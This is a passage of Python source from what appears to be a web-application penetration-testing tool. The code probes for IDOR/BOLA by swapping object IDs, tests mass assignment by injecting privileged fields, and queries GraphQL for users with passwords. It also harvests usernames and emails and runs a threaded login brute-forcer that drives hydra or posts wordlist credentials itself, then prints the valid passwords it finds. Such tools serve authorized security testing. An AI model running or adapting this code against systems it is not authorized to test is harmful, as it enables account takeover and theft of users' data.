            return abs(a - b) / m if m else 0.0

        for item in found_endpoints:
            url = item['url']
            for pattern, group, bogus in id_patterns:
                match = re.search(pattern, url)
                if not match:
                    continue
                original_id = match.group(group)
                prefix = url[:match.start(group)]
                suffix = url[match.end(group):]
                try:
                    base_resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                    if base_resp.status_code != 200:
                        continue
                    base_len = len(base_resp.content)
                except Exception:
                    continue
                if base_len <= 50:
                    continue
                # Control probe with a nonexistent ID. If it returns 200 with
                # size almost identical to baseline, the endpoint does NOT distinguish by ID
                # (always returns the same shell/SPA) -> any 200 would be
                # falso positivo, se salta el endpoint.
                control_200 = False
                control_len = 0
                try:
                    cresp = session.get(prefix + bogus + suffix, timeout=DEFAULT_TIMEOUT)
                    control_200 = cresp.status_code == 200
                    control_len = len(cresp.content)
                except Exception:
                    pass
                if control_200 and _ratio(control_len, base_len) < 0.1:
                    continue
                for alt in alt_ids:
                    if alt == original_id:
                        continue
                    test_url = prefix + alt + suffix
                    if test_url in tested:
                        continue
                    tested.add(test_url)
                    try:
                        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    except Exception:
                        continue
                    if resp.status_code != 200 or len(resp.content) <= 50:
                        continue
                    alt_len = len(resp.content)
                    # If the control returned 200 (representation of "does not exist"),
                    # require that the alternate object differ from that representation.
                    if control_200 and _ratio(alt_len, control_len) < 0.15:
                        continue
                    # Object differs from baseline => access to another resource (BOLA).
                    detail = (f"{url} -> ID={alt} returns 200 ({alt_len}B, "
                              f"base={base_len}B). The endpoint distinguishes by ID and "
                              f"exposes another object without ownership control (OWASP API1).")
                    print_vuln(f"IDOR/BOLA: {detail}")
                    FINDINGS.append({"name": "IDOR / BOLA", "detail": detail, "severity": "high"})
                    hits += 1
        if hits == 0:
            print_info("No clear IDOR evidence in the endpoints found.")
    except Exception as e:
        print_error(f"Error en test IDOR: {e}")


def _safe_json(resp):
    try:
        return resp.json()
    except Exception:
        return None

def _json_field_matches(obj, key, value, depth=0):
    """Busca recursivamente key==value (comparacion laxa de tipos) en un JSON."""
    if depth > 6:
        return False
    if isinstance(obj, dict):
        for k, v in obj.items():
            if str(k).lower() == str(key).lower():
                if str(v).strip().lower() == str(value).strip().lower():
                    return True
            if _json_field_matches(v, key, value, depth + 1):
                return True
    elif isinstance(obj, list):
        for it in obj[:50]:
            if _json_field_matches(it, key, value, depth + 1):
                return True
    return False

def test_api_mass_assignment(found_endpoints, session):
    """OWASP API6: inject privileged fields and confirm persistence with re-GET."""
    try:
        targets = [item for item in found_endpoints
                   if item['status'] in (200, 201, 0)
                   and any(x in item['endpoint'] for x in
                           ('user', 'profile', 'account', 'register', 'update', 'me', 'signup'))]
        if not targets:
            print_info("No endpoints candidatos a Mass Assignment.")
            return
        method_map = [('POST', 'post'), ('PUT', 'put'), ('PATCH', 'patch')]
        for item in targets:
            url = item['url']
            confirmed = False
            for fields in MASS_ASSIGNMENT_FIELDS[:6]:
                if confirmed:
                    break
                key = next(iter(fields.keys()))
                value = fields[key]
                for method_name, method_attr in method_map:
                    try:
                        method = getattr(session, method_attr)
                        resp = method(url, json=fields, timeout=DEFAULT_TIMEOUT)
                    except Exception:
                        continue
                    if resp.status_code not in (200, 201, 202, 204):
                        continue
                    # Strong confirmation: re-GET and verify the privileged field persisted.
                    persisted = False
                    try:
                        verify = session.get(url, timeout=DEFAULT_TIMEOUT)
                        if 'json' in verify.headers.get('Content-Type', '').lower():
                            persisted = _json_field_matches(verify.json(), key, value)
                    except Exception:
                        persisted = False
                    if persisted:
                        detail = (f"{url} [{method_name}] accepted and persisted the field "
                                  f"privilegiado {key}={value} (OWASP API6).")
                        print_vuln(f"Mass Assignment confirmado: {detail}")
                        FINDINGS.append({"name": "Mass Assignment", "detail": detail,
                                         "severity": "high"})
                        confirmed = True
                        break
                    # Weak confirmation: the response reflects the field with the injected value.
                    if _json_field_matches(_safe_json(resp), key, value):
                        detail = (f"{url} [{method_name}] reflects {key}={value} in the response "
                                  f"(possible Mass Assignment, persistence not confirmed).")
                        print_warning(detail)
                        FINDINGS.append({"name": "Mass Assignment (possible)", "detail": detail,
                                         "severity": "medium"})
                        confirmed = True
                        break
    except Exception as e:
        print_error(f"Error en test Mass Assignment: {e}")


def test_graphql(target, session):
    """OWASP API8: GraphQL introspection enabled and dangerous queries."""
    try:
        gql_endpoints = [urljoin(target, ep)
                         for ep in ('/graphql', '/graphiql', '/api/graphql', '/query', '/api/query')]
        introspection = {'query': '{ __schema { types { name } } }'}
        user_enum = {'query': '{ users { id username email password } }'}
        found_any = False
        for gql_url in gql_endpoints:
            try:
                resp = session.post(gql_url, json=introspection,
                                    headers={'Content-Type': 'application/json'},
                                    timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                data = resp.json()
                if 'data' in data and '__schema' in str(data.get('data', {})):
                    found_any = True
                    print_vuln(f"GraphQL introspection enabled: {gql_url}")
                    types = [t['name'] for t in data['data']['__schema']['types']
                             if not t['name'].startswith('__')]
                    print_info(f"  Types exposeds ({len(types)}): {', '.join(types[:15])}")
                    FINDINGS.append({
                        "name": "GraphQL introspeccion habilitada",
                        "detail": f"{gql_url} expone el schema completo via introspeccion "
                                  f"({len(types)} tipos) (OWASP API8).",
                        "severity": "medium",
                    })
                elif 'errors' not in data:
                    found_any = True
                    print_warning(f"GraphQL active (introspection disabled): {gql_url}")
                if found_any:
                    try:
                        r2 = session.post(gql_url, json=user_enum,
                                          headers={'Content-Type': 'application/json'},
                                          timeout=DEFAULT_TIMEOUT)
                        d2 = r2.json()
                        if 'data' in d2 and d2['data'] and 'users' in str(d2['data']):
                            print_vuln(f"GraphQL exposes a list of users at {gql_url}")
                            FINDINGS.append({
                                "name": "GraphQL expone users",
                                "detail": f"{gql_url} allows enumerating users via GraphQL query "
                                          f"(OWASP API8/API3).",
                                "severity": "high",
                            })
                    except Exception:
                        pass
                    break
            except Exception:
                pass
        if not found_any:
            print_info("No GraphQL endpoints detected or active.")
    except Exception as e:
        print_error(f"Error en test GraphQL: {e}")


def test_api_verbose_errors(found_endpoints, session):
    """OWASP API7: detect error responses with exposed internal information."""
    try:
        error_payloads = ["'", '"', '{}', '-1', '../', '%00']
        sensitive_patterns = [
            re.compile(r'exception|traceback|stack.?trace|at \w+\.java:\d+', re.I),
            re.compile(r'sql(?:state)?|mysql|postgresql|sqlite|ora-\d{4,5}', re.I),
            re.compile(r'internal.?server.?error|unhandled.?exception|fatal.?error', re.I),
            re.compile(r'/var/www|c:\\\\inetpub|/home/\w+/|/etc/passwd', re.I),
        ]
        hits = 0
        for item in found_endpoints:
            if item['status'] not in (200, 0):
                continue
            url = item['url']
            for payload in error_payloads[:4]:
                test_url = url.rstrip('/') + payload
                try:
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code in (500, 503):
                        for pat in sensitive_patterns:
                            m = pat.search(resp.text)
                            if m:
                                print_vuln(f"Error verbose [{resp.status_code}]: {test_url}")
                                FINDINGS.append({
                                    "name": "Error verbose / fuga de info interna",
                                    "detail": f"{test_url} [{resp.status_code}] reveals internal detail "
                                              f"('{m.group(0)[:40]}') (OWASP API7).",
                                    "severity": "medium",
                                })
                                hits += 1
                                break
                except Exception:
                    pass
        if hits == 0:
            print_info("No verbose errors detected on the tested endpoints.")
    except Exception as e:
        print_error(f"Error en test verbose errors: {e}")



def enumerate_users_from_endpoints(target, session):
    try:
        users = []
        emails = []
        endpoints_to_try = ["/api/users", "/users", "/rest/users", "/api/user/list", "/admin/users"]
        for endpoint in endpoints_to_try:
            url = urljoin(target, endpoint)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, list):
                            for item in data:
                                if 'username' in item: users.append(item['username'])
                                if 'email' in item: emails.append(item['email'])
                        elif isinstance(data, dict):
                            for key, val in data.items():
                                if key.lower() in ['users','items'] and isinstance(val, list):
                                    for item in val:
                                        if 'username' in item: users.append(item['username'])
                                        if 'email' in item: emails.append(item['email'])
                    except:
                        emails.extend(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
            except:
                pass
        return list(set(users)), list(set(emails))
    except Exception as e:
        print_error(f"Error enumerando users: {e}")
        return [], []

def test_user_enumeration_form(target, session):
    try:
        print_info("Checking possible user enumeration in forms...")
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                if method != 'POST':
                    continue
                inputs = {inp.get('name'): inp for inp in form.find_all('input') if inp.get('name')}
                user_field = None
                for name in inputs:
                    if 'user' in name.lower() or 'email' in name.lower():
                        user_field = name
                        break
                if user_field:
                    form_url = urljoin(target, action) if action else target
                    data = {user_field: 'nonexistent_user_xyz_999'}
                    if 'pass' in str(inputs):
                        data['password'] = 'dummy'
                    resp_test = session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT)
                    if "user not found" in resp_test.text.lower() or "no existe" in resp_test.text.lower():
                        print_vuln("Possible user enumeration detected (differential message)")
    except Exception as e:
        print_error(f"Error in enumeration test: {e}")

def bruteforce_login(target, session, usernames, passlist, max_threads=5):
    """
    Detect the main login form and perform brute force with
    strict validation to minimize false positives.
    """
    try:
        result_data = {
            "credentials": [],
            "login_forms": [],
            "total_combinations": 0,
            "total_passwords": 0,
            "total_users": 0,
        }

        if not usernames:
            usernames = ['admin', 'test']

        # Allow the user to choose method and advanced parameters
        print_info("\n=== Bruteforce avanzado ===")
        use_hydra = False
        hydra_path = shutil.which("hydra")
        if hydra_path:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use hydra for brute force? [Y/n]:")
            resp = input("> ").strip().lower()
            use_hydra = (resp != 'n')
        else:
            print_warning("hydra is not installed or is not in PATH. Using internal method.")

        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter the real login URL (leave empty for auto-detection):")
        login_url = input("> ").strip()
        print_info("The login error message greatly improves accuracy (avoids false positives).")
        print_info("If you leave it empty, auto-detection will be attempted with impossible credentials.")
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Exact failed-login error message (empty = auto-detect):")
        error_msg = input("> ").strip()
        # Flag to harden heuristics when there is no error_msg and no autodetected candidates
        strict_heuristic = False

        # If not specified, autodetect as before
        login_forms_map = {}
        urls_to_check = [login_url] if login_url else [target] + [urljoin(target, path) for path in LOGIN_PATHS]

        def _is_login_like(path):
            p = (path or '').lower()
            return any(k in p for k in ('login', 'signin', 'sign-in', 'auth', 'logon', 'wp-login', 'session'))

        def _score_form(form_url, page_url, user_field, pass_field):
            score = 0
            full = f"{form_url} {page_url}".lower()
            if _is_login_like(full):
                score += 4
            uf = (user_field or '').lower()
            pf = (pass_field or '').lower()
            if uf in ('username', 'user', 'email', 'login'):
                score += 2
            elif uf:
                score += 1
            if pf in ('password', 'pass', 'passwd'):
                score += 2
            elif pf:
                score += 1
            return score

        for page_url in urls_to_check:
            try:
                resp = session.get(page_url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                if HAS_BS4:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        action = form.get('action')
                        method = form.get('method', 'get').upper()
                        if method != 'POST':
                            continue
                        inputs = form.find_all(['input', 'textarea'])
                        user_field = None
                        pass_field = None
                        for inp in inputs:
                            name = inp.get('name', '').lower()
                            if 'user' in name or 'email' in name or 'login' in name or 'username' in name:
                                user_field = inp.get('name')
                            if 'pass' in name or 'password' in name:
                                pass_field = inp.get('name')
                        if user_field and pass_field:
                            form_url = urljoin(page_url, action) if action else page_url
                            hidden_fields = {}
                            for inp in inputs:
                                iname = inp.get('name')
                                itype = (inp.get('type') or '').lower()
                                if iname and itype == 'hidden':
                                    hidden_fields[iname] = inp.get('value', '')
                            score = _score_form(form_url, page_url, user_field, pass_field)
                            form_data = {
                                'url': form_url,
                                'user_field': user_field,
                                'pass_field': pass_field,
                                'hidden_fields': hidden_fields,
                                'score': score,
                                'source_page': page_url,
                            }
                            key = (form_url, user_field, pass_field)
                            prev = login_forms_map.get(key)
                            if prev is None or form_data['score'] > prev['score']:
                                login_forms_map[key] = form_data
            except:
                continue

        login_forms = list(login_forms_map.values())
        for f in login_forms:
            print_good(
                f"Login form detected en {f['url']} "
                f"(user: {f['user_field']}, pass: {f['pass_field']}, score={f['score']})"
            )

        if not login_forms:
            print_warning("No login forms were detected automatically.")
            manual = input("Enter the data manually? (y/n): ").strip().lower()
            if manual in ('y', 's'):
                login_url2 = input("Full login form URL: ").strip()
                user_field = input("Name of the user field: ").strip()
                pass_field = input("Password field name: ").strip()
                if login_url2 and user_field and pass_field:
                    login_forms.append({
                        'url': normalize_url(login_url2),
                        'user_field': user_field,
                        'pass_field': pass_field,
                        'hidden_fields': {},
                        'score': 10,
                        'source_page': normalize_url(login_url2),
                    })
                    print_good("Manual form added.")
                else:
                    print_error("Incomplete data. Bruteforce will not run.")
                    return result_data
            else:
                print_info("Continuing without bruteforce.")
                return result_data

        primary_form = max(
            login_forms,
            key=lambda f: (f.get('score', 0), -len(urlparse(f.get('url', '')).path or '/'))
        )
        print_info(
            f"Using main form: {primary_form['url']} "
            f"({primary_form['user_field']}/{primary_form['pass_field']})"
        )

        # --- Autodetection of the login error message ---
        if not error_msg:
            print_info("Auto-detecting error message with impossible credentials...")
            ERROR_KEYWORDS = [
                'invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied', 'bad credentials',
                'authentication', 'unauthorized', 'forbidden', 'try again',
                'invalid', 'invalid', 'incorrect', 'incorrect', 'denied',
                'not found', 'invalid username or password', 'incorrect password',
                'failed', 'failed', 'try again', 'not valid', 'not valid',
            ]
            candidates = []
            try:
                _probe_payload = {}
                _probe_payload.update(primary_form.get('hidden_fields', {}))
                _probe_payload[primary_form['user_field']] = "__wstg_x7z9q__"
                _probe_payload[primary_form['pass_field']] = "__wstg_x7z9q__"
                _probe_resp = session.post(
                    primary_form['url'], data=_probe_payload,
                    timeout=DEFAULT_TIMEOUT, allow_redirects=True
                )
                _probe_text = _probe_resp.text
                if HAS_BS4:
                    try:
                        _probe_soup = BeautifulSoup(_probe_text, 'html.parser')
                        for _t in _probe_soup(['script', 'style', 'noscript']):
                            _t.decompose()
                        _probe_text = _probe_soup.get_text(separator='\n')
                    except Exception:
                        pass
                _seen = set()
                for _raw in _probe_text.splitlines():
                    _line = re.sub(r'\s+', ' ', _raw).strip()
                    if not _line or len(_line) < 5 or len(_line) > 200:
                        continue
                    _low = _line.lower()
                    if any(k in _low for k in ERROR_KEYWORDS):
                        if _line not in _seen:
                            _seen.add(_line)
                            candidates.append(_line)
                    if len(candidates) >= 10:
                        break
            except Exception as e:
                print_warning(f"Could not autodetectar mensaje de error: {e}")

            if candidates:
                print_good(f"Detected error-message candidates ({len(candidates)}):")
                for i, c in enumerate(candidates, 1):
                    print(f"  {Fore.YELLOW}{i}{Style.RESET_ALL}. {c}")
                print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Choose number [1-{len(candidates)}] (Enter = #1, 'n' = none / strict heuristic):")
                choice = input("> ").strip().lower()
                if choice == 'n':
                    strict_heuristic = True
                    print_warning("No error message: strict heuristic will be applied (fewer false positives).")
                else:
                    try:
                        idx = int(choice) - 1 if choice else 0
                        if 0 <= idx < len(candidates):
                            error_msg = candidates[idx]
                        else:
                            error_msg = candidates[0]
                    except ValueError:
                        error_msg = candidates[0]
                    print_good(f"Mensaje de error seleccionado: '{error_msg}'")
            else:
                strict_heuristic = True
                print_warning("No candidates detected. Strict heuristic will be applied.")

        # Load password list
        passwords = DEFAULT_PASSWORDS
        if passlist and os.path.isfile(passlist):
            with open(passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif passlist:
            print_warning(f"Could not read {passlist}, using default list.")
        else:
            # If no wordlist was provided, try the SecLists wordlist
            if os.path.exists(SECLISTS_PASSWORDS):
                print_info(f"Using default password wordlist: {SECLISTS_PASSWORDS}")
                with open(SECLISTS_PASSWORDS, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            else:
                print_warning("SecLists wordlist not found, using small default list.")

        total_combinations = len(usernames) * len(passwords)
        result_data["total_combinations"] = total_combinations
        result_data["total_passwords"] = len(passwords)
        result_data["total_users"] = len(usernames)
        result_data["login_forms"] = [{
            "url": primary_form.get("url", ""),
            "user_field": primary_form.get("user_field", ""),
            "pass_field": primary_form.get("pass_field", ""),
        }]

        if use_hydra:
            # Create temporary files for users and passwords
            import tempfile
            with tempfile.NamedTemporaryFile('w+', delete=False) as ufile:
                for u in usernames:
                    ufile.write(u + '\n')
                ufile_path = ufile.name
            with tempfile.NamedTemporaryFile('w+', delete=False) as pfile:
                for p in passwords:
                    pfile.write(p + '\n')
                pfile_path = pfile.name

            # Detect form type (POST)
            login_url_hydra = primary_form['url']
            user_field = primary_form['user_field']
            pass_field = primary_form['pass_field']
            parsed_url = urlparse(login_url_hydra)
            host = parsed_url.hostname
            path = parsed_url.path or '/'
            # Build POST data string
            post_data = f"{user_field}=^USER^&{pass_field}=^PASS^"
            for k, v in primary_form.get('hidden_fields', {}).items():
                post_data += f"&{k}={v}"
            # Mensaje de error personalizado
            fail_flag = error_msg if error_msg else "login failed"
            hydra_form = f"{path}:{post_data}:{fail_flag}"
            cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
            if cookie_string:
                hydra_form += f":H=Cookie\\: {cookie_string}"
            # -t 4: limit concurrency (avoids duplicates from races between workers)
            # -I  : ignore previous restorefile (without waiting 10s)
            # -u  : iterate users first by password (better coverage)
            hydra_cmd = [
                "hydra", "-L", ufile_path, "-P", pfile_path,
                "-t", "4", "-I", "-u",
                host,
                "http-post-form",
                hydra_form
            ]
            print_info(f"Running hydra: {_format_external_command(hydra_cmd)}")
            seen_creds = set()
            try:
                process = subprocess.Popen(hydra_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in process.stdout:
                    print(line, end='')
                    if ("login:" in line and "password:" in line):
                        m = re.search(r'login:\s*(\S+)\s*password:\s*(\S+)', line)
                        if m:
                            user, pwd = m.group(1), m.group(2)
                        else:
                            login_idx = line.find("login:")
                            pass_idx = line.find("password:")
                            if login_idx == -1 or pass_idx == -1:
                                continue
                            user = line[login_idx+len("login:"):pass_idx].strip().split()[0]
                            pwd = line[pass_idx+len("password:"):].strip().split()[0]
                        # Deduplicate (hydra can report the same pair 2+ times)
                        if (user, pwd) in seen_creds:
                            continue
                        seen_creds.add((user, pwd))
                        result_data["credentials"].append({"username": user, "password": pwd})
                process.wait()
                print_info("Hydra finalizado.")
            except Exception as e:
                print_error(f"Error running hydra: {e}")
            finally:
                try:
                    os.unlink(ufile_path)
                    os.unlink(pfile_path)
                except Exception:
                    pass

            # Verify credentials with the internal method (real session)
            # to detect users that hydra did not find because of CSRF/cookies/rate limiting.
            usernames_pending = [u for u in usernames if u not in {c["username"] for c in result_data["credentials"]}]
            if usernames_pending:
                print_info(
                    f"Hydra found no credentials for {len(usernames_pending)} user(s) "
                    f"({', '.join(usernames_pending)}). Retrying with real session (CSRF-aware)..."
                )
                # Fall back to the internal method with the reduced list
                usernames = usernames_pending
                total_combinations = len(usernames) * len(passwords)
                result_data["total_combinations"] = (result_data.get("total_combinations") or 0) + total_combinations
            else:
                return result_data

        # --- Classic internal method ---
        print_info(f"Starting brute force with {len(usernames)} users and {len(passwords)} passwords (total {total_combinations} combinations)...")
        found_credentials = set()

        _IMPOSSIBLE_USER = "__wstg_x7z9q__"
        _IMPOSSIBLE_PASS = "__wstg_x7z9q__"

        SUCCESS_KEYWORDS = [
            'logout', 'log out', 'sign out',
            'dashboard', 'panel', 'welcome', 'bienvenido', 'my account', 'mi cuenta',
            'profile', 'perfil'
        ]
        FAILURE_KEYWORDS = [
            'invalid', 'incorrect', 'wrong', 'failed', 'error', 'bad credentials',
            'authentication failed', 'login failed', 'invalid', 'incorrect',
            'user not found', 'incorrect password'
        ]

        def _normalize_path(url_value):
            return (urlparse(url_value).path.rstrip('/') or '/').lower()

        def _is_login_path(path_value):
            p = (path_value or '').lower()
            return any(k in p for k in ('login', 'signin', 'sign-in', 'auth', 'logon', 'wp-login', 'session'))

        def _build_payload(user, pwd):
            payload = {}
            payload.update(primary_form.get('hidden_fields', {}))
            payload[primary_form['user_field']] = user
            payload[primary_form['pass_field']] = pwd
            return payload

        baseline_status = -1
        baseline_path = _normalize_path(primary_form['url'])
        fail_lengths = []
        for seed_user in [_IMPOSSIBLE_USER, usernames[0] if usernames else _IMPOSSIBLE_USER, _IMPOSSIBLE_USER]:
            try:
                r = session.post(
                    primary_form['url'],
                    data=_build_payload(seed_user, _IMPOSSIBLE_PASS),
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True
                )
                if baseline_status == -1:
                    baseline_status = r.status_code
                    baseline_path = _normalize_path(r.url)
                fail_lengths.append(len(r.content))
            except Exception:
                pass

        if fail_lengths:
            fail_min = min(fail_lengths)
            fail_max = max(fail_lengths)
            margin = max(int((fail_max - fail_min) * 0.35), 250)
            fail_min = max(0, fail_min - margin)
            fail_max = fail_max + margin
        else:
            fail_min, fail_max = 0, 0

        print_info(
            f"Baseline login: status={baseline_status} path={baseline_path} "
            f"len=[{fail_min},{fail_max}]"
        )

        def is_successful_login(resp_no_redirect, resp_follow):
            body = resp_follow.text.lower()
            final_path = _normalize_path(resp_follow.url)
            final_len = len(resp_follow.content)
            if error_msg and error_msg.lower() in body:
                return False
            if any(k in body for k in FAILURE_KEYWORDS):
                return False

            # Independent positive signals
            has_success_kw = any(k in body for k in SUCCESS_KEYWORDS)
            status_changed = (baseline_status != -1
                              and resp_follow.status_code != baseline_status
                              and final_path != baseline_path)
            location = resp_no_redirect.headers.get('Location', '')
            location_path = _normalize_path(urljoin(primary_form['url'], location)) if location else ''
            redirect_off_login = (
                resp_no_redirect.status_code in (301, 302, 303, 307, 308)
                and location and not _is_login_path(location_path)
            )
            size_outlier = fail_max > 0 and (final_len < fail_min or final_len > fail_max)
            path_left_login = final_path != baseline_path and not _is_login_path(final_path)

            # Strict mode (without error_msg): requires >=2 different positive signals
            # or at least one "strong" signal (success keyword + path/status change).
            if strict_heuristic:
                strong = has_success_kw and (status_changed or path_left_login or redirect_off_login)
                signals = sum([has_success_kw, status_changed, redirect_off_login,
                               size_outlier, path_left_login])
                return strong or signals >= 2

            # Normal heuristic (when confirmed error_msg exists)
            if _is_login_path(final_path):
                if size_outlier:
                    return True
                return False
            if has_success_kw:
                return True
            if status_changed:
                return True
            if redirect_off_login:
                return True
            if size_outlier:
                return True
            if path_left_login:
                return True
            return False

        def try_cred(user, pwd):
            try:
                payload = _build_payload(user, pwd)
                resp_no_redirect = session.post(
                    primary_form['url'],
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=False
                )
                resp_follow = session.post(
                    primary_form['url'],
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True
                )
                if is_successful_login(resp_no_redirect, resp_follow):
                    found_credentials.add((user, pwd))
                    return True
            except Exception:
                pass
            return False

        if HAS_TQDM:
            with tqdm(total=total_combinations, desc="Bruteforce", unit="comb", ncols=80) as pbar:
                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = []
                    for user in usernames:
                        for pwd in passwords:
                            futures.append(executor.submit(try_cred, user, pwd))
                    for future in as_completed(futures):
                        future.result()
                        pbar.update(1)
        else:
            completed = 0
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                for user in usernames:
                    for pwd in passwords:
                        futures.append(executor.submit(try_cred, user, pwd))
                for future in as_completed(futures):
                    completed += 1
                    if completed % 100 == 0 or completed == total_combinations:
                        print_info(f"Bruteforce progress: {completed}/{total_combinations} combinations tested")
                    future.result()

        # Combine with previous credentials (for example, found by hydra before fallback)
        prev_creds = {(c["username"], c["password"]) for c in result_data.get("credentials", [])}
        all_creds = prev_creds | found_credentials
        if all_creds:
            print_good(f"Brute force completed. Unique credentials found: {len(all_creds)}")
            rows = [
                [f"{Fore.MAGENTA}{u}{Style.RESET_ALL}", f"{Fore.MAGENTA}{p}{Style.RESET_ALL}"]
                for u, p in sorted(all_creds)
            ]
            print_table(
                headers=["USER", "PASSWORD"],
                rows=rows,
                title="Valid credentials:",
            )
            # Also register in FINDINGS
            for u, p in sorted(all_creds):
                FINDINGS.append(f"[CRED] {u}:{p}")
            result_data["credentials"] = [
                {"username": u, "password": p}
                for u, p in sorted(all_creds)
            ]
        else:
            print_info("Bruteforce completed. No valid credentials were found.")
        return result_data
    except Exception as e:
        print_error(f"Error en bruteforce: {e}")
        return {
            "credentials": [],
            "login_forms": [],
            "total_combinations": 0,
            "total_passwords": 0,
            "total_users": 0,
        }

# ========== WORDPRESS / WPSCAN ==========
def _append_finding_once(text):
    if text and text not in FINDINGS:
        FINDINGS.append(text)

def _format_external_command(cmd):
    masked_next = {"--api-token", "--cookie-string", "--password", "-w"}
    header_flags = {"-H", "--header"}
    out = []
    hide = False
    header_value = False
    for part in cmd:
        if hide:
            out.append("***")
            hide = False
            continue
        if header_value:
            value = str(part)
            if value.lower().startswith(("cookie:", "authorization:")):
                out.append(value.split(":", 1)[0] + ": ***")
            else:
                out.append(part)
            header_value = False
            continue
        value = str(part)
        if value.startswith("http.cookie="):
            out.append("http.cookie=***")
            continue
        if "http.cookie=" in value:
            out.append(re.sub(r"http\.cookie=[^,]+", "http.cookie=***", value))
            continue
        if "H=Cookie" in value or "H=Cookie\\:" in value:
            out.append(re.sub(r"H=Cookie\\?:\s*.*", "H=Cookie: ***", value))
            continue
        out.append(part)
        if part in header_flags:
            header_value = True
        if part in masked_next:
            hide = True
    return " ".join(f'"{p}"' if " " in str(p) else str(p) for p in out)

def _stream_process_output(process):
    output = []
    if not process or not process.stdout:
        return ""
    for raw_line in iter(process.stdout.readline, b""):
        if not raw_line:
            break
        line = raw_line.decode("utf-8", errors="replace")
        output.append(line)
        print(line, end="")
    return "".join(output)

def _write_process_bytes(data):
    if not data:
        return
    try:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
    except Exception:
        sys.stdout.write(data.decode("utf-8", errors="replace"))
        sys.stdout.flush()

def _decode_process_output(chunks):
    if not chunks:
        return ""
    return b"".join(chunks).decode("utf-8", errors="replace")

def _stop_interrupted_process(process, name="proceso"):
    if not process or process.poll() is not None:
        return process.returncode if process else None
    try:
        return process.wait(timeout=0.2)
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        return process.returncode

    if process.poll() is None:
        try:
            process.terminate()
            return process.wait(timeout=0.5)
        except subprocess.TimeoutExpired:
            try:
                process.kill()
                return process.wait(timeout=0.5)
            except Exception:
                return process.returncode
        except Exception:
            return process.returncode
    return process.returncode

def _stream_command_output(cmd, capture=True, prefer_pty=True, interrupt_label="proceso"):
    """Run a command while printing its raw output.

    On POSIX, a PTY is used when possible so CLI tools keep their native colour
    decisions. The pipe fallback still preserves any ANSI sequences emitted.
    """
    chunks = []
    process = None
    master_fd = None
    slave_fd = None

    if prefer_pty and os.name != "nt":
        try:
            import pty
            master_fd, slave_fd = pty.openpty()
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
            )
            os.close(slave_fd)
            slave_fd = None
            while True:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                if capture:
                    chunks.append(data)
                _write_process_bytes(data)
            process.wait()
            return process.returncode, _decode_process_output(chunks)
        except KeyboardInterrupt:
            print_warning(f"{interrupt_label} interrupted; deteniendo proceso...")
            _stop_interrupted_process(process, interrupt_label)
            return None, _decode_process_output(chunks)
        except Exception as e:
            print_warning(f"Could not use PTY for {interrupt_label} ({type(e).__name__}); using pipe.")
        finally:
            for fd in (slave_fd, master_fd):
                if fd is not None:
                    try:
                        os.close(fd)
                    except OSError:
                        pass

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process.stdout:
            try:
                data = os.read(process.stdout.fileno(), 4096)
            except OSError:
                break
            if not data:
                break
            if capture:
                chunks.append(data)
            _write_process_bytes(data)
        process.wait()
        return process.returncode, _decode_process_output(chunks)
    except KeyboardInterrupt:
        print_warning(f"{interrupt_label} interrupted; deteniendo proceso...")
        _stop_interrupted_process(process, interrupt_label)
        return None, _decode_process_output(chunks)

def _capture_command_output(cmd, interrupt_label="proceso"):
    process = None
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, _ = process.communicate()
        return process.returncode, (stdout or b"").decode("utf-8", errors="replace")
    except KeyboardInterrupt:
        print_warning(f"{interrupt_label} interrupted; deteniendo proceso...")
        _stop_interrupted_process(process, interrupt_label)
        return None, ""

def _load_json_file(path):
    if not path or not os.path.isfile(path) or os.path.getsize(path) == 0:
        return {}
    with open(path, "rb") as f:
        content = f.read().decode("utf-8", errors="ignore").strip()
    if not content:
        return {}
    try:
        return json.loads(content)
    except Exception:
        pass
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            return json.loads(line)
        except Exception:
            continue
    return {}

def _session_cookie_string(session):
    try:
        pairs = []
        for cookie in session.cookies:
            if cookie.name and cookie.value:
                pairs.append(f"{cookie.name}={cookie.value}")
        return "; ".join(pairs)
    except Exception:
        return ""

def _default_wordpress_password_wordlist():
    if os.path.isfile(ROCKYOU_WORDLIST):
        return ROCKYOU_WORDLIST
    if os.path.isfile(SECLISTS_PASSWORDS):
